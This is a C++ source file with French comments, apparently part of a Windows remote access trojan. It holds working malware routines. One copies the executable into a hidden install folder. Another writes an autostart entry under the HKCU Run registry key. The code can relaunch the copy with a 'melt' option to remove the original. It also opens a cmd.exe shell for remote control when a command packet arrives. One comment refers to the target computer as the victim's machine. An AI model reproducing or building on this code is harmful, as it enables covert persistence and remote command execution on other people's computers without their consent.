//
// Ce fichier contient tous les élément permettant l'initialisation du logiciel
// Permet l'installation du service et de mettre à un endroit spécifique dans l'ordinateur

#include "installationAndStart.h"
#include <process.h>
std::string installationAndStart::CurrentPath;
std::string installationAndStart::installationFolder;
std::string installationAndStart::installationPath;
bool installationAndStart::installing; // état de l'installation


OperationState installationAndStart::init() {

    CurrentPath = getCurrentPath();
    std::cout << "CurrentPath: " << CurrentPath;

    installationFolder = getInstallFolder();
    std::cout << "InstallFolder: " << installationFolder;

    installationPath = getInstallationPath(installationFolder);
    std::cout << "InstallationPath: " << installationPath;

    if (Settings::installSelf){
        if (!locationSet()){
            setLocation();
            installing = true;
        }
    }
    if (Settings::setStartupSelf){
        if (!startupSet()){
            setStartup(Conversion::convStringToWidestring(Settings::startupName).c_str(), Settings::installSelf ? Conversion::convStringToWidestring(installationPath).c_str() : Conversion::convStringToWidestring(CurrentPath).c_str(), NULL);
        }
    }
    runInstalled();
    return OP_Success;
}

std::string installationAndStart::getInstallFolder() {

    std::string rest;
    if (!(Settings::folderName.empty())) {
        rest = "\\" + Settings::folderName;
    }

    std::string concatener;
    char *buf = 0;
    size_t sz = 0;
    if (const char *env_p = getenv(Settings::installLocation.c_str())){
        if (env_p != nullptr) {
            concatener = std::string(env_p) + rest;
            free(buf);
        } else{
            //todo gestion de probleme getpath
        }
    }
    return concatener;
}

std::string installationAndStart::getInstallationPath(std::string instFolder) {
    std::string concatener;
    concatener = instFolder + "\\" + Settings::fileName;
    return concatener;
}

std::string installationAndStart::getCurrentPath() {
    char buffer[MAX_PATH];
    GetModuleFileName(0, buffer, MAX_PATH);
    return std::string(buffer);
}

void installationAndStart::setLocation() {
    if (!installationAndStart::directoryExists(installationAndStart::installationFolder.c_str()))
        if (!CreateDirectory(installationAndStart::installationFolder.c_str(), NULL))	{ // equivalent de mkdir pour creer un dossier
            //todo fail
        }
    CopyFile(installationAndStart::CurrentPath.c_str(), installationAndStart::installationPath.c_str(), 0);
}

bool installationAndStart::locationSet() {
    if (installationAndStart::CurrentPath == installationAndStart::installationPath){return true;
    }else {
        return false;
    }
}

bool installationAndStart::directoryExists(const char* dirName)	{

    DWORD attribs = ::GetFileAttributesA(dirName);
    if (attribs == INVALID_FILE_ATTRIBUTES)
        return false;
    return true;
}

void installationAndStart::runInstalled(){
    if (installationAndStart::installing)
        if (!Settings::startOnNextBoot){ // si on doit lancer l'application au démarrage du poste de la vicitme
            installationAndStart::startProcess(installationAndStart::installationPath.c_str(),
                                               Settings::meltSelf ? Conversion::convStringToLPTSTR("t " + installationAndStart::CurrentPath) : NULL);
        }
}

void installationAndStart::startProcess(LPCTSTR lpApplicationName, LPTSTR lpArguments) {
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));
    CreateProcess(lpApplicationName, lpArguments, NULL,NULL,
                  FALSE,0,NULL,NULL,&si,&pi);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
}

bool installationAndStart::setStartup(PCWSTR pszAppName, PCWSTR pathToExe, PCWSTR args) {
    HKEY hKey = NULL;
    LONG lResult = 0;
    bool fSuccess;
    DWORD dwSize;
    const size_t count = MAX_PATH * 2;
    wchar_t szValue[count] = {
            //todo
    };

    wcscpy_s(szValue, count, L"\"");
    wcscat_s(szValue, count, pathToExe);
    wcscat_s(szValue, count, L"\" ");

    if (args != NULL){
        wcscat_s(szValue, count, args);
    }

    lResult = RegCreateKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                              0, NULL, 0, (KEY_WRITE | KEY_READ),
                              NULL, &hKey, NULL);

    fSuccess = (lResult == 0);
    if (fSuccess){
        dwSize = (wcslen(szValue) + 1) * 2;
        lResult = RegSetValueExW(hKey, pszAppName, 0, REG_SZ, (BYTE*)szValue, dwSize);
        fSuccess = (lResult == 0);
    }

    if (hKey != NULL){
        RegCloseKey(hKey);
        hKey = NULL;
    }
    return fSuccess;
}

bool installationAndStart::startupSet() {
    if (installationAndStart::regValueExists(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", Settings::startupName.c_str())) {return true;
    }else {
        return false;
    }
}

bool installationAndStart::regValueExists(HKEY hKey, LPCSTR keyPath, LPCSTR valueName) {
    DWORD dwType = 0;
    long lResult = 0;
    HKEY hKeyPlaceholder = NULL;

    lResult = RegOpenKeyEx(hKey, keyPath, NULL, KEY_READ, &hKeyPlaceholder);
    if (lResult == ERROR_SUCCESS){
        lResult = RegQueryValueEx(hKeyPlaceholder, valueName, NULL, &dwType, NULL, NULL);

        if (lResult == ERROR_SUCCESS){
            return true;}else {
            return false;
        }
    }else {
        return false;
    }
}

std::string installationAndStart::processCommand(std::string command) { //fonction utiliser lors de la réception de paquet demandant le control a distance
    if (processParameter(command, "remoteControl")){
        if (!CMD::cmdOpen){
            if (command == "cmd"){
                command = "C:\\WINDOWS\\system32\\cmd.exe";
            }
            if (Utility::fileExists(command)){
                char* buffer = new char[command.length() + 3];
                buffer[command.length()] = '\0';
                strcpy_s(buffer, command.length() + 2, command.c_str());

                _beginthreadex(NULL, NULL, (_beginthreadex_proc_type)CMD::cmdThread, (LPVOID)buffer, NULL, NULL);
                while (!CMD::cmdOpen){
                    Sleep(50);
                }
                delete[] buffer;
                return "connection au cmd reussi";
            }else{
                return "fichier innexistant.";
            }
        }else{
            CMD::cmdptr->writeCMD("exit");
            CMD::cmdOpen = false;
            return "Deconnexion au cmd reussi";
        }
    }else{
        return "Command '" + command + "' non reconnu.";
    }
}

void installationAndStart::handleError(int errType, bool errSevere) {
    if (errSevere){
        //todo HAAAAAAAAAAAAAAAAAAAAAAAAAA
    }else{
        switch (errType)
        {
           //todo erreur
        }
    }
}
//parametres de cmd reference https://msdn.microsoft.com/en-us/library/windows/desktop/ms682499(v=vs.85).aspx
bool installationAndStart::processParameter(std::string &command, std::string compCommand) {
    std::string::size_type i = command.find(compCommand);
    if (i != std::string::npos){
        command.erase(i, compCommand.length() + 1);
        return true;
    }else {
        return false;
    }
}
